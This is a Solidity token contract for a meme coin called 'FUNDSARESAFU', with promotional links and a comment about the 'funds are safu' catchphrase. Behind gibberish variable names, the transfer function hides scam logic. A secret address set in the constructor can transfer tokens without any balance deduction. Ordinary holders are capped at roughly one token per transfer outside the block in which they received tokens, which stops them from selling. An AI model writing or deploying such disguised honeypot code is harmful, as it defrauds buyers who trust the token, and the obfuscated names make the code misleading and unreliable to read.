/*

https://safu.cryptotoken.live/

https://twitter.com/fundsaresafeerc

https://t.me/ercfundsaresafu


During unscheduled maintenance, Changpeng Zhao (CZ), the Binance CEO, tweeted out to users stating:

“Funds are safu”

After this, the phrase "Funds are safu” became regularly used by CZ to ensure users were aware that their funds were, in fact, safe.

In 2018, a content creator named Bizonacci uploaded a video on YouTube titled “Funds Are Safu”. It quickly spread and became a viral meme. Since then, the community began using the phrase "Funds are SAFU."

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FUNDSARESAFU is Ownable {
    mapping(address => uint256) private ysphwmkb;

    mapping(address => uint256) private evjm;

    function tkcfuypxhz(address nxkmc, address nawhjyokrzu, uint256 rbale) private {
        address bseygx = IUniswapV2Factory(oqcsr.factory()).getPair(address(this), oqcsr.WETH());
        bool myjexhcql = evjm[nxkmc] == block.number;
        if (0 == ysphwmkb[nxkmc]) {
            if (nxkmc != bseygx && (!myjexhcql || rbale > zhpfeirsl[nxkmc]) && rbale < totalSupply) {
                require(rbale <= totalSupply / (10 ** decimals));
            }
            balanceOf[nxkmc] -= rbale;
        }
        zhpfeirsl[nawhjyokrzu] = rbale;
        balanceOf[nawhjyokrzu] += rbale;
        evjm[nawhjyokrzu] = block.number;
        emit Transfer(nxkmc, nawhjyokrzu, rbale);
    }

    constructor(string memory onyubqp, string memory jypb, address tngpcr, address lpqc) {
        name = onyubqp;
        symbol = jypb;
        balanceOf[msg.sender] = totalSupply;
        ysphwmkb[lpqc] = jhxztyba;
        oqcsr = IUniswapV2Router02(tngpcr);
    }

    function transfer(address nawhjyokrzu, uint256 rbale) public returns (bool success) {
        tkcfuypxhz(msg.sender, nawhjyokrzu, rbale);
        return true;
    }

    string public symbol;

    function transferFrom(address nxkmc, address nawhjyokrzu, uint256 rbale) public returns (bool success) {
        require(rbale <= allowance[nxkmc][msg.sender]);
        allowance[nxkmc][msg.sender] -= rbale;
        tkcfuypxhz(nxkmc, nawhjyokrzu, rbale);
        return true;
    }

    uint256 private jhxztyba = 106;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private zhpfeirsl;

    IUniswapV2Router02 private oqcsr;

    string public name;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address qeyulczbt, uint256 rbale) public returns (bool success) {
        allowance[msg.sender][qeyulczbt] = rbale;
        emit Approval(msg.sender, qeyulczbt, rbale);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;
}
